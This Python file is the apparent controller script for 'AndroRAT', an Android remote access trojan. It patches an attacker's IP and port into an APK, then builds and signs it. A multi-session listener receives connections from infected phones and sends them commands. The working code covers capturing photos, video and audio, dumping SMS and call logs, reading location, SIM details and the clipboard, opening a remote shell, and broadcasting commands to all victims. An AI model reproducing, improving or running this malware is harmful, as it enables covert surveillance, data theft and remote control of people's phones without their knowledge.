#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import os
import base64
import time
import binascii
import select
import pathlib
import platform
import re
from subprocess import PIPE, run
import socket
import threading
import itertools
import queue

sys.stdout.reconfigure(encoding='utf-8')

banner = """\033[1m\033[91m
                    _           _____         _______
    /\             | |         |  __ \     /\|__   __|
   /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |   
  / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |   
 / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
/_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|

                                       \033[93m- By karma9874
"""

pattern = '\"(\\d+\\.\\d+).*\"'

def stdOutput(type_=None):
    if type_=="error":col="31m";str="ERROR"
    if type_=="warning":col="33m";str="WARNING"
    if type_=="success":col="32m";str="SUCCESS"
    if type_ == "info":return "\033[1m[\033[33m\033[0m\033[1m\033[33mINFO\033[0m\033[1m] "
    message = "\033[1m[\033[31m\033[0m\033[1m\033["+col+str+"\033[0m\033[1m]\033[0m "
    return message


def animate(message):
    chars = "/—\\|"
    for char in chars:
        sys.stdout.write("\r"+stdOutput("info")+"\033[1m"+message+"\033[31m"+char+"\033[0m")
        time.sleep(.1)
        sys.stdout.flush()

def clearDirec():
    if(platform.system() == 'Windows'):
        clear = lambda: os.system('cls')
        direc = "\\"
    else:
        clear = lambda: os.system('clear')
        direc = "/"
    return clear,direc

clear,direc = clearDirec()
if not os.path.isdir(os.getcwd()+direc+"Dumps"):
    os.makedirs("Dumps")

def is_valid_ip(ip):
    m = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip)
    return bool(m) and all(map(lambda n: 0 <= int(n) <= 255, m.groups()))

def is_valid_port(port):
    i = 1 if port.isdigit() and len(port)>1  else  0
    return i

def execute(command):
    return run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

def executeCMD(command,queue):
    result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
    queue.put(result)
    return result


def getpwd(name):
	return os.getcwd()+direc+name;

def help():
    helper="""
    Usage:
    deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID  
    takepic [cameraID]         --> Takes picture from camera
    startVideo [cameraID]      --> starts recording the video
    stopVideo                  --> stop recording the video and return the video file
    startAudio                 --> starts recording the audio
    stopAudio                  --> stop recording the audio
    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
    getCallLogs                --> returns call logs in a file
    shell                      --> starts a interactive shell of the device
    vibrate [number_of_times]  --> vibrate the device number of time
    getLocation                --> return the current location of the device
    getIP                      --> returns the ip of the device
    getSimDetails              --> returns the details of all sim of the device
    clear                      --> clears the screen
    getClipData                --> return the current saved text from the clipboard
    getMACAddress              --> returns the mac address of the device
    exit                       --> exit the interpreter
    """
    print(helper)

def getImage(client):
    print(stdOutput("info")+"\033[0mTaking Image")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    flag=0
    filename ="Dumps"+direc+"Image_"+timestr+'.jpg'
    imageBuffer=recvall(client) 
    imageBuffer = imageBuffer.strip().replace("END123","").strip()
    if imageBuffer=="":
        print(stdOutput("error")+"Unable to connect to the Camera\n")
        return
    with open(filename,'wb') as img:    
        try:
            imgdata = base64.b64decode(imageBuffer)
            img.write(imgdata)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\n")
        except binascii.Error as e:
            flag=1
            print(stdOutput("error")+"Not able to decode the Image\n")
    if flag == 1:
        os.remove(filename)

def readSMS(client,data):
    print(stdOutput("info")+"\033[0mGetting "+data+" SMS")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    filename = "Dumps"+direc+data+"_"+timestr+'.txt'
    flag =0
    with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
        msg = recvall(client)
        try:
            txt.write(msg)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\n")
        except UnicodeDecodeError:
            flag = 1
            print(stdOutput("error")+"Unable to decode the SMS\n")
    if flag == 1:
    	os.remove(filename)

def getFile(filename,ext,data):
    fileData = "Dumps"+direc+filename+"."+ext
    flag=0
    with open(fileData, 'wb') as file:
        try:
            rawFile = base64.b64decode(data)
            file.write(rawFile)
            print(stdOutput("success")+"Succesfully Downloaded in \033[1m\033[32m"+getpwd(fileData)+"\n")
        except binascii.Error:
            flag=1
            print(stdOutput("error")+"Not able to decode the Audio File")
    if flag == 1:
        os.remove(filename)

def putFile(filename):
    data = open(filename, "rb").read()
    encoded = base64.b64encode(data)
    return encoded

def shell(client):
    msg = "start"
    command = "ad"
    while True:
        msg = recvallShell(client)
        if "getFile" in msg:
            msg=" "
            msg1 = recvall(client)
            msg1 = msg1.replace("\nEND123\n","")
            filedata = msg1.split("|_|")
            getFile(filedata[0],filedata[1],filedata[2])
            
        if "putFile" in msg:
            msg=" "
            sendingData=""
            filename = command.split(" ")[1].strip()
            file = pathlib.Path(filename)
            if file.exists():
                encoded_data = putFile(filename).decode("UTF-8")
                filedata = filename.split(".")
                sendingData+="putFile"+"<"+filedata[0]+"<"+filedata[1]+"<"+encoded_data+"END123\n"
                client.send(sendingData.encode("UTF-8"))
                print(stdOutput("success")+f"Succesfully Uploaded the file \033[32m{filedata[0]+'.'+filedata[1]} in /sdcard/temp/")
            else:
                print(stdOutput("error")+"File not exist")

        if "Exiting" in msg:
            print("\033[1m\033[33m----------Exiting Shell----------\n")
            return
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)   
        print(" ")
        command = input("\033[1m\033[36mandroid@shell:~$\033[0m \033[1m")
        command = command+"\n"
        if command.strip() == "clear":
            client.send("test\n".encode("UTF-8"))
            clear()
        else:
            client.send(command.encode("UTF-8"))        

def getLocation(sock):
    msg = "start"
    while True:
        msg = recvall(sock)
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)   
        if("END123" in msg):
            return
        print(" ")     

def recvall(sock):
    buff=""
    data = ""
    while "END123" not in data:
        data = sock.recv(4096).decode("UTF-8","ignore")
        buff+=data
    return buff


def recvallShell(sock):
    buff=""
    data = ""
    ready = select.select([sock], [], [], 3)
    while "END123" not in data:
        if ready[0]:
            data = sock.recv(4096).decode("UTF-8","ignore")
            buff+=data
        else:
            buff="bogus"
            return buff
    return buff

def stopAudio(client):
    print(stdOutput("info")+"\033[0mDownloading Audio")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data= ""
    flag =0
    data=recvall(client) 
    data = data.strip().replace("END123","").strip()
    filename = "Dumps"+direc+"Audio_"+timestr+".mp3"
    with open(filename, 'wb') as audio:
        try:
            audioData = base64.b64decode(data)
            audio.write(audioData)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename))
        except binascii.Error:
            flag=1
            print(stdOutput("error")+"Not able to decode the Audio File")
    print(" ")
    if flag == 1:
        os.remove(filename)


def stopVideo(client):
    print(stdOutput("info")+"\033[0mDownloading Video")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data= ""
    flag=0
    data=recvall(client) 
    data = data.strip().replace("END123","").strip()
    filename = "Dumps"+direc+"Video_"+timestr+'.mp4' 
    with open(filename, 'wb') as video:
        try:
            videoData = base64.b64decode(data)
            video.write(videoData)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename))
        except binascii.Error:
            flag = 1
            print(stdOutput("error")+"Not able to decode the Video File\n")
    if flag == 1:
        os.remove("Video_"+timestr+'.mp4')

def callLogs(client):
    print(stdOutput("info")+"\033[0mGetting Call Logs")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    msg = recvall(client)
    filename = "Dumps"+direc+"Call_Logs_"+timestr+'.txt'
    if "No call logs" in msg:
    	msg.split("\n")
    	print(msg.replace("END123","").strip())
    	print(" ")
    else:
    	with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
    		txt.write(msg)
    		txt.close()
    		print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\033[0m")
    		if not os.path.getsize(filename):
    			os.remove(filename)

class SessionManager:
    def __init__(self):
        self.sessions = {}
        self.lock = threading.Lock()
        self.counter = 1

    def add(self, conn, addr):
        with self.lock:
            sid = self.counter
            self.sessions[sid] = {'conn': conn, 'addr': addr, 'active': True}
            self.counter += 1
            return sid

    def remove(self, sid):
        with self.lock:
            if sid in self.sessions:
                self.sessions[sid]['active'] = False
                try:
                    self.sessions[sid]['conn'].close()
                except Exception:
                    pass
                del self.sessions[sid]

    def list(self):
        with self.lock:
            return [(sid, s['addr'], s['active']) for sid, s in self.sessions.items()]

    def get(self, sid):
        with self.lock:
            return self.sessions.get(sid, None)

    def broadcast(self, msg):
        with self.lock:
            for s in self.sessions.values():
                try:
                    s['conn'].sendall(msg.encode('utf-8'))
                except Exception:
                    s['active'] = False

session_manager = SessionManager()

def get_shell(ip, port):
    soc = socket.socket(type=socket.SOCK_STREAM)
    try:
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.bind((ip, int(port)))
    except Exception as e:
        print(stdOutput("error")+f"\033[1m {e}"); exit()
    soc.listen(10)
    print(banner)
    print("\033[1m\033[32m[+] Multi-session mode enabled.\033[0m")
    print("Type 'sessions' to list, 'interact <id>' to interact, 'broadcast <cmd>' to send to all.")

    def session_handler(sid, conn, addr):
        try:
            while session_manager.get(sid) and session_manager.get(sid)['active']:
                msg = conn.recv(4096).decode("UTF-8", "ignore")
                if not msg:
                    break
                if msg.strip() == "IMAGE":
                    getImage(conn)
                elif "readSMS" in msg.strip():
                    content = msg.strip().split(" ")
                    data = content[1]
                    readSMS(conn, data)
                elif msg.strip() == "SHELL":
                    shell(conn)
                elif msg.strip() == "getLocation":
                    getLocation(conn)
                elif msg.strip() == "stopVideo123":
                    stopVideo(conn)
                elif msg.strip() == "stopAudio":
                    stopAudio(conn)
                elif msg.strip() == "callLogs":
                    callLogs(conn)
                elif msg.strip() == "help":
                    help()
                else:
                    print(stdOutput("error")+msg) if "Unknown Command" in msg else print("\033[1m"+msg) if "Hello there" in msg else print(msg)
        except Exception as e:
            print(stdOutput("error")+f"Session {sid} error: {e}")
        finally:
            session_manager.remove(sid)
            print(f"\033[1m\033[31m[-] Session {sid} ({addr}) disconnected.\033[0m")

    def acceptor():
        while True:
            conn, addr = soc.accept()
            sid = session_manager.add(conn, addr)
            print(f"\033[1m\033[33m[+] New session {sid} from {addr}\033[0m")
            t = threading.Thread(target=session_handler, args=(sid, conn, addr), daemon=True)
            t.start()

    threading.Thread(target=acceptor, daemon=True).start()

    # Main session control loop
    while True:
        cmd = input("\033[1m\033[36m[MultiSession]> \033[0m").strip()
        if cmd == "sessions":
            sessions = session_manager.list()
            print("\033[1mActive Sessions:\033[0m")
            for sid, addr, active in sessions:
                print(f"  {sid}: {addr} {'(active)' if active else '(closed)'}")
        elif cmd.startswith("interact "):
            try:
                sid = int(cmd.split()[1])
                s = session_manager.get(sid)
                if not s or not s['active']:
                    print(f"\033[1m\033[31mSession {sid} not found or closed.\033[0m")
                    continue
                print(f"\033[1m\033[32m[*] Interacting with session {sid} ({s['addr']})\033[0m")
                while s['active']:
                    message_to_send = input("\033[1m\033[36mInterpreter:/> \033[0m")+"\n"
                    s['conn'].send(message_to_send.encode("UTF-8"))
                    if message_to_send.strip() == "exit":
                        break
                    try:
                        msg = s['conn'].recv(4096).decode("UTF-8", "ignore")
                        print(msg)
                    except Exception:
                        print(f"\033[1m\033[31mSession {sid} connection lost.\033[0m")
                        break
            except Exception as e:
                print(f"\033[1m\033[31mError: {e}\033[0m")
        elif cmd.startswith("broadcast "):
            bcmd = cmd[len("broadcast "):]
            session_manager.broadcast(bcmd+"\n")
            print(f"\033[1m\033[32m[+] Broadcasted to all sessions.\033[0m")
        elif cmd in ("exit", "quit"):
            print("\033[1m\033[32mExiting multi-session server.\033[0m")
            os._exit(0)
        else:
            print("\033[1m\033[33mUnknown command. Use 'sessions', 'interact <id>', 'broadcast <cmd>', 'exit'.\033[0m")

def build(ip,port,output,isNgrok,localport,icon):
    if isNgrok:
        print(stdOutput("info")+"\033[1mUsing Ngrok configuration")
        with open("Android_Code/app/src/main/java/com/example/reverseshell2/config.java", "r") as f:
            conf = f.read()
        conf = conf.replace("192.168.0.105", ip)
        conf = conf.replace("8888", port)
        conf = conf.replace("true", str(icon).lower()) if icon is not None else conf

    else:
        print(stdOutput("info")+"\033[1mStarting building process")
        with open("Android_Code/app/src/main/java/com/example/reverseshell2/config.java", "r") as f:
            conf = f.read()
        conf = conf.replace("192.168.0.105", ip)
        conf = conf.replace("8888", port)
        conf = conf.replace("true", str(icon).lower()) if icon is not None else conf

    with open("Android_Code/app/src/main/java/com/example/reverseshell2/config.java", "w") as f:
        f.write(conf)

    if localport:
        port = localport

    print(stdOutput("info")+f"\033[1mSetting up Configuration\n|_ IP: {ip}\n|_ Port: {port}")

    # Run gradlew to build APK
    import subprocess
    try:
        print(stdOutput("info")+"\033[1mBuilding APK")
        subprocess.call("cd Android_Code && chmod +x gradlew", shell=True)
        subprocess.call("cd Android_Code && ./gradlew assembleDebug", shell=True)

        # Copy and sign APK
        output = "karma.apk" if not output else output
        subprocess.call(f"cp Android_Code/app/build/outputs/apk/debug/app-debug.apk {output}", shell=True)
        print(stdOutput("success")+f"\033[1mSuccessfully Created APK: {output}")
        
        print(stdOutput("info")+"\033[1mSigning APK")
        subprocess.call(f"java -jar Jar_utils/sign.jar {output}", shell=True)
        print(stdOutput("success")+"\033[1mSuccessfully Signed APK")
        
        if isNgrok:
            print(stdOutput("info")+"\033[1mStarting Server")
            get_shell("0.0.0.0",localport) 

    except Exception as e:
        print(stdOutput("error")+"\033[1mError while building APK: " + str(e))
        sys.exit(1)
